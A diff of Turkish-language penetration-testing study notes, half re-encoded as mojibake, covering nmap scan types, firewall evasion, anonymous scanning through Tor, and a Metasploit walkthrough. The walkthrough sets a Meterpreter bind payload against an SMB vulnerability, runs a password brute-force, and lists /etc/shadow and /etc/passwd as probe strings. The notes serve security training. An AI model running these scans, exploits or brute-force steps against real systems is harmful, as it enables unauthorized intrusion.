@@ -1,374 +1,363 @@
-------------------------------------------------------------------------------------
-Bir işe girmeye çalış,harekete geç,bu alanda profesyonel olarak işler yapmaya çalış
-Profesonel taraf için şirkete girme stajlar vs. kendine yatırım yapnız gerekebilcek
-sıkı bir program ile sonuçlara ulaşamamız gerekecek.
---------------------------------------------------------------------------------------------
-Evernote hesabı aç = bir not defteri uygulaması
-Not paylaşımı yapılacak. O notlarda lablar sunulacak.
-Bu adreslerden labarotuar ortamlarından neyi nasıl yapıcagımızı daha kolay ve etkili
-bir ögrenme şekli gerçekleştirilebilir.
---------------------------------------------------------------------------------------
-
 --------------------------------------------------------------------------------------
 Aktif bilgi toplama
 ----------------------------------------------------------------------
 Nmap temelleri
-Nmap tarama yönetemleri
-Keşif Aşamaları
-Port,Servis,Version Taramaları
-İşletim Sistemi Tespiti
+Nmap tarama yÃ¶netemleri
+KeÅŸif AÅŸamalarÄ±
+Port,Servis,Version TaramalarÄ±
+Ä°ÅŸletim Sistemi Tespiti
 Nmap Scripting Engine
-Dns,smtp,snmp üzerinden keşif
+Dns,smtp,snmp Ã¼zerinden keÅŸif
 anonim bilgi toplama
 ------------------------------------------------------
-Pasif bilgileri doğrula
-Ip aralğından aktif olan sistemler
+Pasif bilgileri doÄŸrula
+Ip aralÄŸÄ±ndan aktif olan sistemler
 Portlar ve servisler
-Yazılımlar ve versiyonlar
-İşlerim Sistemleri
-Detaylı veri elde etme
+YazÄ±lÄ±mlar ve versiyonlar
+Ä°ÅŸlerim Sistemleri
+DetaylÄ± veri elde etme
 -----------------------------------------------------
 mesele temel teknikleri anlamak
 rfc=kural dizisi
-bir port taraması yapılır açık olan portlar bulunur
-bunun üzerinden çalışan yazılımları görmeliyim
-versiyonlarını görmeliyim ki zaafiyetleri varmı.
+bir port taramasÄ± yapÄ±lÄ±r aÃ§Ä±k olan portlar bulunur
+bunun Ã¼zerinden Ã§alÄ±ÅŸan yazÄ±lÄ±mlarÄ± gÃ¶rmeliyim
+versiyonlarÄ±nÄ± gÃ¶rmeliyim ki zaafiyetleri varmÄ±.
 eger eski bir version ise o eski versionun zaafiyetinden
 faydalanabiliriz.
 ----------------------------------------------------
 ** Nmap - Network mapping **
-Ağ keşif
-Port,servis taraması
+AÄŸ keÅŸif
+Port,servis taramasÄ±
 versiyon tarama
-işletim sistemi zafiyeti vb.araştır.
+iÅŸletim sistemi zafiyeti vb.araÅŸtÄ±r.
 ------------------------------------------------------------------------------------------------------------
-** Nmap host tanımlama **
-subnetmask=alt ağ hesaplama=araştır anlarsın|
+** Nmap host tanÄ±mlama **
+subnetmask=alt aÄŸ hesaplama=araÅŸtÄ±r anlarsÄ±n|
 nmap ip_adresi
 nmap ip_adresi-15
 nmap ip_adresi,5,6,7
-nmap -iL iplist.txt = bir ip listesi oluştur.o ip listesinindekileri tara.
-nmap ip_adresi/24 -exclude ip_adresi = bir network bir bu yeri arama demek için
+nmap -iL iplist.txt = bir ip listesi oluÅŸtur.o ip listesinindekileri tara.
+nmap ip_adresi/24 -exclude ip_adresi = bir network bir bu yeri arama demek iÃ§in
 ---------------------------------------------------------------------------------------------------------
-Nmap port durumları ve anlamları
-Open:port açık
-TCP 3-lü el sıkışma.
-Syn=varsayılan port tarama tekniğidir.hızlı ve kayıtsız
-Tarama işlemi gönderilen SYN paketlerine gelen cevaba göre gerçekleşir.
-SYN paketine RST+ACK geliyorsa portun kapalı olduğu.eger SYN+ACK geliyorsa portun açık
-oldugu anlaşılır ve cevap olrak RST gönderilir.
+Nmap port durumlarÄ± ve anlamlarÄ±
+Open:port aÃ§Ä±k
+TCP 3-lÃ¼ el sÄ±kÄ±ÅŸma.
+Syn=varsayÄ±lan port tarama tekniÄŸidir.hÄ±zlÄ± ve kayÄ±tsÄ±z
+Tarama iÅŸlemi gÃ¶nderilen SYN paketlerine gelen cevaba gÃ¶re gerÃ§ekleÅŸir.
+SYN paketine RST+ACK geliyorsa portun kapalÄ± olduÄŸu.eger SYN+ACK geliyorsa portun aÃ§Ä±k
+oldugu anlaÅŸÄ±lÄ±r ve cevap olrak RST gÃ¶nderilir.
 SYN scan atni zamanda Half Open Scan olarak bilinir.
-nmap -sS 10.0.1.5 = SYN taraması yapmak için
+nmap -sS 10.0.1.5 = SYN taramasÄ± yapmak iÃ§in
 ----------------------------------------------------------------------------------------------------------------
-İletişime geçildigi için artık karşı tarafında bizden haberi var
-dikkatli olmamız gerekiyor yaptıgımız işlemlerde
+Ä°letiÅŸime geÃ§ildigi iÃ§in artÄ±k karÅŸÄ± tarafÄ±nda bizden haberi var
+dikkatli olmamÄ±z gerekiyor yaptÄ±gÄ±mÄ±z iÅŸlemlerde
 ---------------------------------------------------------------------------------------------------------------
 TCP scan-nmap
 ----------------------------------------------------------------------------------------------------------
-TCP connect scan,üşlü el sıkışmayı tamamlar ve loglara düşer.
-daha kesin sonuçlar elde edilir.
-port durumları SYN paketine gelen cevaba gerçekleşir.
+TCP connect scan,Ã¼ÅŸlÃ¼ el sÄ±kÄ±ÅŸmayÄ± tamamlar ve loglara dÃ¼ÅŸer.
+daha kesin sonuÃ§lar elde edilir.
+port durumlarÄ± SYN paketine gelen cevaba gerÃ§ekleÅŸir.
 
-SYN paketine karşılık RST+ACK geliyorsa portun kapalı olduğu anlaşılır.
-SYN+ACK geliyorsa portun açık oldgu anlaşılır ve üçlü el sıkışma tamamlanır.
+SYN paketine karÅŸÄ±lÄ±k RST+ACK geliyorsa portun kapalÄ± olduÄŸu anlaÅŸÄ±lÄ±r.
+SYN+ACK geliyorsa portun aÃ§Ä±k oldgu anlaÅŸÄ±lÄ±r ve Ã¼Ã§lÃ¼ el sÄ±kÄ±ÅŸma tamamlanÄ±r.
 nmap -sT 10.0.1.5
 -----------------------------------------------------------------------------------------------------------------------
-SYN proxy gelen bütün syn isteklerine syn+ack gönder=yani eger tcp işlemi tamamlanırsa
-dikkate alırım,ama eger syn işleminden cevap alınca işlemi keserse dikkate alma gibi bir işle
-biraz araştır.otomatik saldırları engelemek için alınmış bir önlemdir.Pentest'lerin dikkat etmesi gereken bir konu
-önemli.Güvenilir sonuç için Tcp scan daha kesindir.
+SYN proxy gelen bÃ¼tÃ¼n syn isteklerine syn+ack gÃ¶nder=yani eger tcp iÅŸlemi tamamlanÄ±rsa
+dikkate alÄ±rÄ±m,ama eger syn iÅŸleminden cevap alÄ±nca iÅŸlemi keserse dikkate alma gibi bir iÅŸle
+biraz araÅŸtÄ±r.otomatik saldÄ±rlarÄ± engelemek iÃ§in alÄ±nmÄ±ÅŸ bir Ã¶nlemdir.Pentest'lerin dikkat etmesi gereken bir konu
+Ã¶nemli.GÃ¼venilir sonuÃ§ iÃ§in Tcp scan daha kesindir.
 ------------------------------------------------------------------------------------------------
 Nmap UDP Scan
-UDP portlarını analiz etmek için kullanılır.
-UDP paketlerine gelen cevaba göre analiz yapılır.
-Gelen cevap ICMP port Unreachable ise portun kapalıdır.
-Gelen cevap UDP paketi ise portun açıktır.
+UDP portlarÄ±nÄ± analiz etmek iÃ§in kullanÄ±lÄ±r.
+UDP paketlerine gelen cevaba gÃ¶re analiz yapÄ±lÄ±r.
+Gelen cevap ICMP port Unreachable ise portun kapalÄ±dÄ±r.
+Gelen cevap UDP paketi ise portun aÃ§Ä±ktÄ±r.
 nmap -sU ip_adresi
 cevap olarak udp geliyorsa orda bir servis var
-eger unreachable geliyorsa servis kapalı.
+eger unreachable geliyorsa servis kapalÄ±.
 --------------------------------------------------------------------------------------
-Nmap- NULL/FIN/XMAS scan =(FİREWALL'U şaşırmak için araştır)=
+Nmap- NULL/FIN/XMAS scan =(FÄ°REWALL'U ÅŸaÅŸÄ±rmak iÃ§in araÅŸtÄ±r)=
 Analizleri benzerdir.
-Gönderilen pakete RST+ACK dönüyorsa portun kapalı,hiçbir paket dönüyorsa 
-portun açık olduğu anlaşılır.
+GÃ¶nderilen pakete RST+ACK dÃ¶nÃ¼yorsa portun kapalÄ±,hiÃ§bir paket dÃ¶nÃ¼yorsa 
+portun aÃ§Ä±k olduÄŸu anlaÅŸÄ±lÄ±r.
 Cevap ICMP Unreachable ile port filtrelidir.
-farklı flag degerleri kullanılarak aşılabilir önlemler.veya boş flag gönderilir.
-şaşırtma amaçlı.
+farklÄ± flag degerleri kullanÄ±larak aÅŸÄ±labilir Ã¶nlemler.veya boÅŸ flag gÃ¶nderilir.
+ÅŸaÅŸÄ±rtma amaÃ§lÄ±.
 --------------------------------------------------------------------------------
-Nmap- ACK/Windows Scan=(ARAŞTIR FİREWALL'U AŞMAK İÇİN)=
-ACK Scan Firewall ayarlarını analizi için sıkca kullanılır.
+Nmap- ACK/Windows Scan=(ARAÅTIR FÄ°REWALL'U AÅMAK Ä°Ã‡Ä°N)=
+ACK Scan Firewall ayarlarÄ±nÄ± analizi iÃ§in sÄ±kca kullanÄ±lÄ±r.
 --------------------------------------------------------------------------------------
-Varsayılan portlar bellidir.Bulunabilir.Ama bunlar ayarlanarak degiştirilebilir.
-Dolayısıyla sadece tahminsel sonuçlardır.Kesin sonuç istiyorsan.Version taraması yaparız
-tek port için yapalım ki süreç uzamasın.Versiondan gerçekten hangi port onu anlayabiliriz.
-standartın dışında bişey olsa arayacaktı bulamazsa bulamadım dicekti.
+VarsayÄ±lan portlar bellidir.Bulunabilir.Ama bunlar ayarlanarak degiÅŸtirilebilir.
+DolayÄ±sÄ±yla sadece tahminsel sonuÃ§lardÄ±r.Kesin sonuÃ§ istiyorsan.Version taramasÄ± yaparÄ±z
+tek port iÃ§in yapalÄ±m ki sÃ¼reÃ§ uzamasÄ±n.Versiondan gerÃ§ekten hangi port onu anlayabiliriz.
+standartÄ±n dÄ±ÅŸÄ±nda biÅŸey olsa arayacaktÄ± bulamazsa bulamadÄ±m dicekti.
 -------------------------------------------------------------------------------------------
-nmap -sS -sV komutu ile sonuçlar görülebilir.
-işletim sistemi keşfi = nmap -sT -O
-time to live = her işletim sistemin de farklılık gösterir.bu degere göre 
-hangi işletim sisteme ait oldugu kesdirilebilir.
-Açık ve kapalı portların time to live kodlarından hesaplayarak sonuç sunar.
-denemeleri yapmadık teorik olarak isledik=sen kevgirde dene uzun işlemler oldugu için
+nmap -sS -sV komutu ile sonuÃ§lar gÃ¶rÃ¼lebilir.
+iÅŸletim sistemi keÅŸfi = nmap -sT -O
+time to live = her iÅŸletim sistemin de farklÄ±lÄ±k gÃ¶sterir.bu degere gÃ¶re 
+hangi iÅŸletim sisteme ait oldugu kesdirilebilir.
+AÃ§Ä±k ve kapalÄ± portlarÄ±n time to live kodlarÄ±ndan hesaplayarak sonuÃ§ sunar.
+denemeleri yapmadÄ±k teorik olarak isledik=sen kevgirde dene uzun iÅŸlemler oldugu iÃ§in
 ------------------------------------------------------------------------------------------
-nmap ip_Adresi -sT -A = bütün version ve sürüm bilgilerini daha detaylı 
-şekilde ekrana getirir.Detaylı veri almak için.Ben bu makineye gidereken nerelerden
-atladım gbi şeyleri gösteriyor.Firewall varsa şaşırtma yapabilir.
+nmap ip_Adresi -sT -A = bÃ¼tÃ¼n version ve sÃ¼rÃ¼m bilgilerini daha detaylÄ± 
+ÅŸekilde ekrana getirir.DetaylÄ± veri almak iÃ§in.Ben bu makineye gidereken nerelerden
+atladÄ±m gbi ÅŸeyleri gÃ¶steriyor.Firewall varsa ÅŸaÅŸÄ±rtma yapabilir.
 -----------------------------------------------------------------------------------
-nmap hiçbişey söylemezsen en çok kullanılan bin(1000) portu tarar.
--p- = komutunu verirsek bütün portları tarar.
-parametreler ile en çok kullananılar portları tara
-ve sadece şu portu tara şu aralıgı tara gibi parametreler vererek daha ayrıltılı
+nmap hiÃ§biÅŸey sÃ¶ylemezsen en Ã§ok kullanÄ±lan bin(1000) portu tarar.
+-p- = komutunu verirsek bÃ¼tÃ¼n portlarÄ± tarar.
+parametreler ile en Ã§ok kullananÄ±lar portlarÄ± tara
+ve sadece ÅŸu portu tara ÅŸu aralÄ±gÄ± tara gibi parametreler vererek daha ayrÄ±ltÄ±lÄ±
 aramalar yapabilirz.
 ----------------------------------------------------------------------------------------
-windows sistem yönetimi egitmi
+windows sistem yÃ¶netimi egitmi
 -----------------------------------------------------------------------------------------
-versiyon taraması nasıl yapılır= yolladıgı ssh komutu ile banner ı çekerek verisonu veriyor.bannerlara sahte yazılar
-ile yanlış yöntenlerdime yapılabilir.yapılandırma ayarları ile bunlar sağlanabilir.(yani bu şekilde bizde şaşırma yapabiliriz)
+versiyon taramasÄ± nasÄ±l yapÄ±lÄ±r= yolladÄ±gÄ± ssh komutu ile banner Ä± Ã§ekerek verisonu veriyor.bannerlara sahte yazÄ±lar
+ile yanlÄ±ÅŸ yÃ¶ntenlerdime yapÄ±labilir.yapÄ±landÄ±rma ayarlarÄ± ile bunlar saÄŸlanabilir.(yani bu ÅŸekilde bizde ÅŸaÅŸÄ±rma yapabiliriz)
 -----------------------------------------------------------------------------------
-nmap çıktısını bir dosyanın içne aktarma parametsinide vardır.
-her türlü çıktıyı detaylı bir şekilde kayıt tutabilir.grep ile ayıklama 
-işlemleri yaparak güzel sonuçlar alabiliriz.
-çıktılar önemli parametreleri araştır.
+nmap Ã§Ä±ktÄ±sÄ±nÄ± bir dosyanÄ±n iÃ§ne aktarma parametsinide vardÄ±r.
+her tÃ¼rlÃ¼ Ã§Ä±ktÄ±yÄ± detaylÄ± bir ÅŸekilde kayÄ±t tutabilir.grep ile ayÄ±klama 
+iÅŸlemleri yaparak gÃ¼zel sonuÃ§lar alabiliriz.
+Ã§Ä±ktÄ±lar Ã¶nemli parametreleri araÅŸtÄ±r.
 nmap ip_Adresi -sT -oA daka
-eger hiçbişey söylemezsek bir ping paketi ile dürter,ondan sonra port taraması yapar,
-bu dürtme olayı yanlış yönlendirme ile yanlış saptamalara sebep olabilir.
+eger hiÃ§biÅŸey sÃ¶ylemezsek bir ping paketi ile dÃ¼rter,ondan sonra port taramasÄ± yapar,
+bu dÃ¼rtme olayÄ± yanlÄ±ÅŸ yÃ¶nlendirme ile yanlÄ±ÅŸ saptamalara sebep olabilir.
 -------------------------------------------------------------------------------------
 Gerekli nmap parametreleri
--h = yardım,nmap ile ilgili herşey mevcut
--T = hız degeri nekdar hızlı tarıycak(varsayılan 3),firewall ile bu hız durumu
-esas alanarak engellenebilir.bu hızı verirken firewall'uda düşünmek gerek. 
+-h = yardÄ±m,nmap ile ilgili herÅŸey mevcut
+-T = hÄ±z degeri nekdar hÄ±zlÄ± tarÄ±ycak(varsayÄ±lan 3),firewall ile bu hÄ±z durumu
+esas alanarak engellenebilir.bu hÄ±zÄ± verirken firewall'uda dÃ¼ÅŸÃ¼nmek gerek. 
 -Pn= 
 -V = 
--v = çıktıları detaylandırır.ara ara not verir.çoklu aramalarda beklesi uzun oldugu için kullanılır
--n = dns çözümlemesi yapma demek
--open = bana sadece açık portları getir demek
--6 = ipv6 aktifleştirme 
+-v = Ã§Ä±ktÄ±larÄ± detaylandÄ±rÄ±r.ara ara not verir.Ã§oklu aramalarda beklesi uzun oldugu iÃ§in kullanÄ±lÄ±r
+-n = dns Ã§Ã¶zÃ¼mlemesi yapma demek
+-open = bana sadece aÃ§Ä±k portlarÄ± getir demek
+-6 = ipv6 aktifleÅŸtirme 
 --------------------------------------------------------------------------------
-nmap = udp taraması
+nmap = udp taramasÄ±
 --------------------------------------------------------------------------------
-Cloudfare = korumasını araştır.Saldırı türleri hakkında bilgi edin araştırma yap
+Cloudfare = korumasÄ±nÄ± araÅŸtÄ±r.SaldÄ±rÄ± tÃ¼rleri hakkÄ±nda bilgi edin araÅŸtÄ±rma yap
 -----------------------------------------------------------------------------------
-Nmap Scripting Engine = Nmap için geliştirilmiş scriptler bir sürü işleve ve amaca 
-hitap eder şekilde mevcutttur.Araştır.Kullanışlı olanları kullanmayı ögren.
---scprit ile hangi scprittin çalıştıraılabilegini görebiliriz.
-Exploit etme aşamaları = araştır.
-smb-brute üzerinden brute-force yapılabilir. 
+Nmap Scripting Engine = Nmap iÃ§in geliÅŸtirilmiÅŸ scriptler bir sÃ¼rÃ¼ iÅŸleve ve amaca 
+hitap eder ÅŸekilde mevcutttur.AraÅŸtÄ±r.KullanÄ±ÅŸlÄ± olanlarÄ± kullanmayÄ± Ã¶gren.
+--scprit ile hangi scprittin Ã§alÄ±ÅŸtÄ±raÄ±labilegini gÃ¶rebiliriz.
+Exploit etme aÅŸamalarÄ± = araÅŸtÄ±r.
+smb-brute Ã¼zerinden brute-force yapÄ±labilir. 
 ---------------------------------------------------------------------------------------
 Nmap firewall atlatma sistemleri
-Paket parçalama yöntemi
-ip üzerinden port taraması ypıyor arada Spoofing yapıyor
-Sanki tarama geliyormuş gibi bir mac zehirlemesi yapabiliyor-fortinet firewall cihazı
-firewall-bypass script'ti = karşı tarafta firewalla yakalanmadan git.
+Paket parÃ§alama yÃ¶ntemi
+ip Ã¼zerinden port taramasÄ± ypÄ±yor arada Spoofing yapÄ±yor
+Sanki tarama geliyormuÅŸ gibi bir mac zehirlemesi yapabiliyor-fortinet firewall cihazÄ±
+firewall-bypass script'ti = karÅŸÄ± tarafta firewalla yakalanmadan git.
 --------------------------------------------------------------------------------------
-DNS üzerinden bilgi toplama 
-fierce --dns = dns üzerinden bilgi toplamaya yarayan bir araç
+DNS Ã¼zerinden bilgi toplama 
+fierce --dns = dns Ã¼zerinden bilgi toplamaya yarayan bir araÃ§
 fierce --dns zonetransfer.me = ile direkt getirir.
 -------------------------------------------------------------------------------------
 Zone Transfer
 -----------------------------------------------------------------------------------
-real ip verme olayını araştır.
+real ip verme olayÄ±nÄ± araÅŸtÄ±r.
 -------------------------------------------------------------------------------------
-Sık kullanılan keşif araçları
-enum4linux=bu makine adı
+SÄ±k kullanÄ±lan keÅŸif araÃ§larÄ±
+enum4linux=bu makine adÄ±
 nbtscan  =
 onesixtyone =
 snmpwalk
 smtp-user-enum
 dirb 
-YUkardakileri araştır.
+YUkardakileri araÅŸtÄ±r.
 -------------------------------------------------------------------------------------------
 smtp = bir mail protoklu
-netstat kullanımını detaylı ögren
+netstat kullanÄ±mÄ±nÄ± detaylÄ± Ã¶gren
 -------------------------------------------------------------------------------------------
-Anonim tarama işlemleri
+Anonim tarama iÅŸlemleri
 Tor
-proxychains=sana bi proyx tanımlıyorum,tor u tanımlıyoruz burdan anonim arama saglayabliyoruz
+proxychains=sana bi proyx tanÄ±mlÄ±yorum,tor u tanÄ±mlÄ±yoruz burdan anonim arama saglayabliyoruz
 Nipe - Perl script
-proxychains nmap -sT =tor üzerinden anomin tarama gerçekleştirme.
-proxychains kullanımını detaylandır.
+proxychains nmap -sT =tor Ã¼zerinden anomin tarama gerÃ§ekleÅŸtirme.
+proxychains kullanÄ±mÄ±nÄ± detaylandÄ±r.
 ---------------------------------------------------------------------------------------------
-Waf / firewall keşfi
-Gönderilen SYN paketine karşılık
+Waf / firewall keÅŸfi
+GÃ¶nderilen SYN paketine karÅŸÄ±lÄ±k
 SYN-ACK gelir
 RST gelir 
-karşımızdan gerçekten ne var bilmek lazım
+karÅŸÄ±mÄ±zdan gerÃ§ekten ne var bilmek lazÄ±m
 cmd.exe
 /etc/shadow
 /etc/passwd
-cevaplardan çıkarımlar yapılabilir.
-baglantı sıfırlanırsa veya zaman aşımana ugrsa IPS vardır.
+cevaplardan Ã§Ä±karÄ±mlar yapÄ±labilir.
+baglantÄ± sÄ±fÄ±rlanÄ±rsa veya zaman aÅŸÄ±mana ugrsa IPS vardÄ±r.
 ----------------------------------------------------------------------------------------------
-wafw00f = sıkıntılı istekler yapan bi uygulama.firewall keşiflerinde kulllanılır.
-ne oldugunu bazen anlar bazen anlamaz karşımızdaki duruma bağlı.
-dig = komutu araştır. / ileri seviye web güvenligi araştır.
+wafw00f = sÄ±kÄ±ntÄ±lÄ± istekler yapan bi uygulama.firewall keÅŸiflerinde kulllanÄ±lÄ±r.
+ne oldugunu bazen anlar bazen anlamaz karÅŸÄ±mÄ±zdaki duruma baÄŸlÄ±.
+dig = komutu araÅŸtÄ±r. / ileri seviye web gÃ¼venligi araÅŸtÄ±r.
 ----------------------------------------------------------------------------------------------
-Zafiyet Keşfi
-web ve ağ ile alakalı konular.
-zafiyet kavramı = uygulamada protkolde  etc. daha önce keşfedilmiş yara atak türüne izin veren sistem
-zafiyeti sömürecek koda expolit diyoruz.araç expolit = sömürdükten sonrada payload yapılacak.
-amaca yönelik yönelik saldırı payload yapıcagı tahribat.içeri bir ajan yerleştirmek gibi  düşün.
+Zafiyet KeÅŸfi
+web ve aÄŸ ile alakalÄ± konular.
+zafiyet kavramÄ± = uygulamada protkolde  etc. daha Ã¶nce keÅŸfedilmiÅŸ yara atak tÃ¼rÃ¼ne izin veren sistem
+zafiyeti sÃ¶mÃ¼recek koda expolit diyoruz.araÃ§ expolit = sÃ¶mÃ¼rdÃ¼kten sonrada payload yapÄ±lacak.
+amaca yÃ¶nelik yÃ¶nelik saldÄ±rÄ± payload yapÄ±cagÄ± tahribat.iÃ§eri bir ajan yerleÅŸtirmek gibi  dÃ¼ÅŸÃ¼n.
 --------------------------------------------------------------------------------------------------
-Openvas = Zafiyet keşif aracı 	I Galismero = Zafiyet keşif aracı I Nikto = Zafiyet keşif aracı I W3af             	
-	  Açık kaynak		I	      Toolkit		  I	    Açık kaynak		I
-	  Gelişmiş özellikler	I				  I				I
-	  Güncel		I				  I				I
+Openvas = Zafiyet keÅŸif aracÄ± 	I Galismero = Zafiyet keÅŸif aracÄ± I Nikto = Zafiyet keÅŸif aracÄ± I W3af             	
+	  AÃ§Ä±k kaynak		I	      Toolkit		  I	    AÃ§Ä±k kaynak		I
+	  GeliÅŸmiÅŸ Ã¶zellikler	I				  I				I
+	  GÃ¼ncel		I				  I				I
 --------------------------------------------------------------------------------------------------------------
 (/) Core impact (/) Netsparker (/) Burpsuite (/) Nessus (/) 
 --------------------------------------------------------------------------------------
-Exploit aşaması
+Exploit aÅŸamasÄ±
 -------------------------------------------------------------------------------------------------
-Zararlı yazılımları kullanma aşamaları
-Bi zafiyeti sömürmek için kullandıgımız kod = exploit
-Lokal 	exploit = sızdık,yetkimiz çok düşük,ama root olmak istiyoruz,burda işletim sistemi
-içindeki zafiyetleri kullanmamız lazım.
-remote 	exploit = uzaktan erişim için kullanılmaktadır.
+ZararlÄ± yazÄ±lÄ±mlarÄ± kullanma aÅŸamalarÄ±
+Bi zafiyeti sÃ¶mÃ¼rmek iÃ§in kullandÄ±gÄ±mÄ±z kod = exploit
+Lokal 	exploit = sÄ±zdÄ±k,yetkimiz Ã§ok dÃ¼ÅŸÃ¼k,ama root olmak istiyoruz,burda iÅŸletim sistemi
+iÃ§indeki zafiyetleri kullanmamÄ±z lazÄ±m.
+remote 	exploit = uzaktan eriÅŸim iÃ§in kullanÄ±lmaktadÄ±r.
 0day 	exploit = 
-Dos 	exploit = karşıadaki sistemi crash edicek çalışılamaz hale getirecek.
-Web 	exploit = web uygulamaları yönelik geliştirrilen zaafiyetler.
-Shellcode = exploit gerçekleştirildikden sonra çalıştırılacak özelletirilmiş binaryler
-NOP = no operation, herhangi bir işlevi yok yada hafızadaki yeri ögrenmek için bellegi dolduran bitler
-Exploit Veritabanları = Exploit-db,0day.today,Securityfocus.com,ledb.ir 
-perl-pytgon-ruby = önemli diller.exploit geliştirilen diller.
-ortak exploit geliştirme dili framework çözümü.Exploit Frameworkler.
-Metconsoasploit Framework = Payload(otomatik payloadlar ile kolaylık sağlar),exploit,auxiliary(yardımcı araçlar),encoder(güvenlik duvarlarını atlatmak için)
-Metasploit kurulumu ve güncellemesine interentten bak.
-msfdb inif = veritabnı yapısını indirir.
-msfconsole=metaspoit açılır.
-db_status = kontrol saglanır.
-workspace -a daka = daka adına workspace oluşturtur. silmek için -d komutu kullan.
+Dos 	exploit = karÅŸÄ±adaki sistemi crash edicek Ã§alÄ±ÅŸÄ±lamaz hale getirecek.
+Web 	exploit = web uygulamalarÄ± yÃ¶nelik geliÅŸtirrilen zaafiyetler.
+Shellcode = exploit gerÃ§ekleÅŸtirildikden sonra Ã§alÄ±ÅŸtÄ±rÄ±lacak Ã¶zelletirilmiÅŸ binaryler
+NOP = no operation, herhangi bir iÅŸlevi yok yada hafÄ±zadaki yeri Ã¶grenmek iÃ§in bellegi dolduran bitler
+Exploit VeritabanlarÄ± = Exploit-db,0day.today,Securityfocus.com,ledb.ir 
+perl-pytgon-ruby = Ã¶nemli diller.exploit geliÅŸtirilen diller.
+ortak exploit geliÅŸtirme dili framework Ã§Ã¶zÃ¼mÃ¼.Exploit Frameworkler.
+Metconsoasploit Framework = Payload(otomatik payloadlar ile kolaylÄ±k saÄŸlar),exploit,auxiliary(yardÄ±mcÄ± araÃ§lar),encoder(gÃ¼venlik duvarlarÄ±nÄ± atlatmak iÃ§in)
+Metasploit kurulumu ve gÃ¼ncellemesine interentten bak.
+msfdb inif = veritabnÄ± yapÄ±sÄ±nÄ± indirir.
+msfconsole=metaspoit aÃ§Ä±lÄ±r.
+db_status = kontrol saglanÄ±r.
+workspace -a daka = daka adÄ±na workspace oluÅŸturtur. silmek iÃ§in -d komutu kullan.
 -------------------------------------------------------------------------------------------------------------------------------------------
--oA daka -sT -Pn -n -T2 -sV -0 --top-port=2000 = etkili bir nmap taraması için baya güzel
+-oA daka -sT -Pn -n -T2 -sV -0 --top-port=2000 = etkili bir nmap taramasÄ± iÃ§in baya gÃ¼zel
 ------------------------------------------------------------------------------------------------------------------------
-service postgresql start = veritabanını açmak için kullanılır.
-db_status = veritabanı görüntüleme
-services -p 445 = 445 portu olanları göster.
-services = servisleri göster.
-içerik import etme konusunu iyice araştır.
+service postgresql start = veritabanÄ±nÄ± aÃ§mak iÃ§in kullanÄ±lÄ±r.
+db_status = veritabanÄ± gÃ¶rÃ¼ntÃ¼leme
+services -p 445 = 445 portu olanlarÄ± gÃ¶ster.
+services = servisleri gÃ¶ster.
+iÃ§erik import etme konusunu iyice araÅŸtÄ±r.
 -------------------------------------------------------------------------------------------
-db_import ile istedigimiz dosyayı import edebiliriz.
-vulns -h = bilgiler alınabilir.
-db_export -f /dosya_dizin. başkasına gönderip çıkartmak için.başkasına gönderiyor diyeri import ediyor kullanmaya devam ediyor
+db_import ile istedigimiz dosyayÄ± import edebiliriz.
+vulns -h = bilgiler alÄ±nabilir.
+db_export -f /dosya_dizin. baÅŸkasÄ±na gÃ¶nderip Ã§Ä±kartmak iÃ§in.baÅŸkasÄ±na gÃ¶nderiyor diyeri import ediyor kullanmaya devam ediyor
 ------------------------------------------------------------------------------------------------------------------------
-searchsploit redis = arama yapıyor = bir expolit aldık örnek nasıl yazıldıgını nano ile baktık ögrendik içinde ne oldugunu.
+searchsploit redis = arama yapÄ±yor = bir expolit aldÄ±k Ã¶rnek nasÄ±l yazÄ±ldÄ±gÄ±nÄ± nano ile baktÄ±k Ã¶grendik iÃ§inde ne oldugunu.
 ---------------------------------------------------------------------------------------------------------------------------------
-metaspolit içinde help yazarak ne var ne yok görebiliriz.
+metaspolit iÃ§inde help yazarak ne var ne yok gÃ¶rebiliriz.
 -------------------------------------------------------------------------------------------------------------------------------------
 Temel komutlar.
-| back = geridön | background= arkaplana atıyor | help = neler var hangi parametre hangi işe yarar. | set = ayarları düzenleme işlemi | show = göstermek | run meterpreteri çalıştır use gibi | load unload |
+| back = geridÃ¶n | background= arkaplana atÄ±yor | help = neler var hangi parametre hangi iÅŸe yarar. | set = ayarlarÄ± dÃ¼zenleme iÅŸlemi | show = gÃ¶stermek | run meterpreteri Ã§alÄ±ÅŸtÄ±r use gibi | load unload |
 db_nmap ip_adresi -p 445 --scprit smb-vuln-* = exploit buluyoruz.
-buldugumuz exploiti = search ile aratıyoruz. bilgileri kontrol ediyoruz.
-use expoilt padini giriyoruz. önümüze ayarlar geliyor.belli başlısı var.ordaki ayrıntılı bir araştırma yap
+buldugumuz exploiti = search ile aratÄ±yoruz. bilgileri kontrol ediyoruz.
+use expoilt padini giriyoruz. Ã¶nÃ¼mÃ¼ze ayarlar geliyor.belli baÅŸlÄ±sÄ± var.ordaki ayrÄ±ntÄ±lÄ± bir araÅŸtÄ±rma yap
 set RHOST ip_adresi diyerek gidiyoruz.
-options diyerek parameterenin degitigini görebiliriz.
-set payload windows/x64/meterpeter/bind_tcp = payload windows'meterpeter diye bişey yolluyoruz ajan gibi (sömürü payload ile ajan ekledik)
-options diyoruz gelen payload ayarlarını kullanıyoruz. exploit gerçekleştirkten sonra RHOST ayaga kalkıcak ve payload ajanımız(meterpreter) aktif olucak :)
-ajan içerde :) bundan sonra yapabilcegimiz herşey meterpretere baglı shell diyerek makinenin komut satırına ulaşılabilir.
-sysinfo = ile makine bilgilerini görebiliriz.
+options diyerek parameterenin degitigini gÃ¶rebiliriz.
+set payload windows/x64/meterpeter/bind_tcp = payload windows'meterpeter diye biÅŸey yolluyoruz ajan gibi (sÃ¶mÃ¼rÃ¼ payload ile ajan ekledik)
+options diyoruz gelen payload ayarlarÄ±nÄ± kullanÄ±yoruz. exploit gerÃ§ekleÅŸtirkten sonra RHOST ayaga kalkÄ±cak ve payload ajanÄ±mÄ±z(meterpreter) aktif olucak :)
+ajan iÃ§erde :) bundan sonra yapabilcegimiz herÅŸey meterpretere baglÄ± shell diyerek makinenin komut satÄ±rÄ±na ulaÅŸÄ±labilir.
+sysinfo = ile makine bilgilerini gÃ¶rebiliriz.
 -----------------------------------------------------------------------------------------------------------------------------------------
-bruto force atak basitçe
-2 dosya oluşturduk 
+bruto force atak basitÃ§e
+2 dosya oluÅŸturduk 
 set pass_file /root/passlist.txt
 set user_
 set user_file /root/userlist.txt
 run
 -------------------------------------------------------------------------------------------------------------------------------------------------
-Payload örneklerini araştır.Bu konu önemli.
+Payload Ã¶rneklerini araÅŸtÄ±r.Bu konu Ã¶nemli.
